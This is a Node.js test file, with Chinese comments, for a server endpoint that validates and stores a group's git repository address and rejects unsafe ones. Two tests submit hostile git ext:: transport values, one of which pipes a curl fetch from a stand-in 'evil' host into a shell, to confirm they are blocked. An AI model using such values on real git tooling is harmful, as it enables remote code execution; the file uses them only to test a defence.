// 群项目「仓库地址」端点接线:POST /api/groups/repo(校验 → git init/origin → 存配置 → 群内通知)
// 与 /api/groups/repo/test。跑真 HTTP + 临时配置 + 临时 workdir,git 只在本地跑(不走网络)。
// 模块级逻辑在 gitrepo.test.js;这里只钉端点:字段有没有落盘、非法地址会不会被挡在 git 之前、
// buildState 回不回 repo、通知发没发。

const { test } = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const { createUiServer } = require('../../src/ui/server')
const { rmTmpDir } = require('./tmpdir')

async function withServer(run) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sbot-repo-'))
  const wd = path.join(dir, 'proj'); fs.mkdirSync(wd)
  const cfgPath = path.join(dir, 'sbot.config.json')
  fs.writeFileSync(cfgPath, JSON.stringify({
    providers: { claude: {} }, defaultProvider: 'claude',
    groups: { G: { workdir: wd, provider: 'claude' } },
  }))
  const notices = []
  const control = { setProvider() {}, clearSession() {}, stop() {}, interrupt() {}, notifyGroup: (chatId, text) => notices.push({ chatId, text }) }
  const ui = createUiServer({ sessionsPath: path.join(path.dirname(cfgPath), 'ui-sessions.json'), auditPath: path.join(path.dirname(cfgPath), 'audit.jsonl'), configPath: cfgPath, control })
  await new Promise((r) => ui.listen(0, '127.0.0.1', r))
  const base = `http://127.0.0.1:${ui.server.address().port}`
  // 锚点抠不到就先关服务器再抛:否则心跳定时器让 node --test 永不退出,CI 静默挂死而不是变红(2026-09-07 踩过)
  const tokenMatch = (await (await fetch(base + '/')).text()).match(/let TOKEN='([a-f0-9]{32})'/)
  if (!tokenMatch) { ui.close(); throw new Error('页面里抠不到注入的令牌锚点') }
  const token = tokenMatch[1]
  const H = { 'x-sbot-token': token, 'content-type': 'application/json' }
  const post = (p, body) => fetch(base + p, { method: 'POST', headers: H, body: JSON.stringify(body) })
  const state = async () => (await (await fetch(base + '/api/state', { headers: H })).json())
  const cfg = () => JSON.parse(fs.readFileSync(cfgPath, 'utf8'))
  try { await run({ post, state, cfg, wd, notices }) } finally { ui.close(); await rmTmpDir(dir) }
}

test('server: 保存仓库地址 → 落配置 + workdir git init + 设 origin + 群内通知', async () => {
  await withServer(async ({ post, state, cfg, wd, notices }) => {
    const r = await post('/api/groups/repo', { chatId: 'G', repo: 'git@codeup.aliyun.com:org/proj.git' })
    assert.equal(r.status, 200)
    const j = await r.json()
    assert.equal(j.initialized, true, '空目录应被 git init')
    assert.equal(cfg().groups.G.repo, 'git@codeup.aliyun.com:org/proj.git', '地址应落盘')
    assert.equal(fs.existsSync(path.join(wd, '.git')), true, 'workdir 应成为 git 仓库')
    assert.equal(notices.length, 1)
    assert.match(notices[0].text, /已关联代码仓库/)
    assert.equal(notices[0].chatId, 'G')
    // buildState 要把 repo 回给前端,否则群卡回填不出来
    assert.equal((await state()).groups.find((g) => g.chatId === 'G').repo, 'git@codeup.aliyun.com:org/proj.git')
  })
})

test('server: 非法地址 400,且不碰 workdir(ext:: 是 RCE 面,必须挡在 git 之前)', async () => {
  await withServer(async ({ post, cfg, wd }) => {
    const r = await post('/api/groups/repo', { chatId: 'G', repo: 'ext::sh -c "curl evil|sh"' })
    assert.equal(r.status, 400)
    assert.match((await r.json()).error, /ext::/)
    assert.equal(cfg().groups.G.repo, undefined, '拒绝的地址不该落盘')
    assert.equal(fs.existsSync(path.join(wd, '.git')), false, '校验失败不该 git init')
  })
})

test('server: HTTPS 地址被拒(只收 SSH)', async () => {
  await withServer(async ({ post }) => {
    const r = await post('/api/groups/repo', { chatId: 'G', repo: 'https://codeup.aliyun.com/org/p.git' })
    assert.equal(r.status, 400)
    assert.match((await r.json()).error, /SSH/)
  })
})

test('server: 留空保存 = 解除关联(只清配置,不动 workdir 里的 git)', async () => {
  await withServer(async ({ post, cfg, wd }) => {
    await post('/api/groups/repo', { chatId: 'G', repo: 'git@h:o/p.git' })
    assert.equal(cfg().groups.G.repo, 'git@h:o/p.git')
    const r = await post('/api/groups/repo', { chatId: 'G', repo: '' })
    assert.equal(r.status, 200)
    assert.equal((await r.json()).cleared, true)
    assert.equal(cfg().groups.G.repo, undefined, '配置里的 repo 应被移除')
    assert.equal(fs.existsSync(path.join(wd, '.git')), true, '解除关联不该删掉本地 git 仓库')
  })
})

test('server: 未绑定的 chatId → 400', async () => {
  await withServer(async ({ post }) => {
    const r = await post('/api/groups/repo', { chatId: 'NOPE', repo: 'git@h:o/p.git' })
    assert.equal(r.status, 400)
    assert.match((await r.json()).error, /未找到该群绑定/)
  })
})

test('server: 换地址 → set-url 覆盖,标 replaced', async () => {
  await withServer(async ({ post, cfg }) => {
    await post('/api/groups/repo', { chatId: 'G', repo: 'git@h:o/old.git' })
    const r = await post('/api/groups/repo', { chatId: 'G', repo: 'git@h:o/new.git' })
    const j = await r.json()
    assert.equal(j.replaced, true)
    assert.equal(j.initialized, false, '已是仓库 ⇒ 不该再 init')
    assert.equal(cfg().groups.G.repo, 'git@h:o/new.git')
  })
})

test('server: /api/groups/repo/test 对非法地址 400(不出网)', async () => {
  await withServer(async ({ post }) => {
    const r = await post('/api/groups/repo/test', { repo: 'ext::whoami' })
    assert.equal(r.status, 400)
    assert.match((await r.json()).error, /ext::/)
  })
})
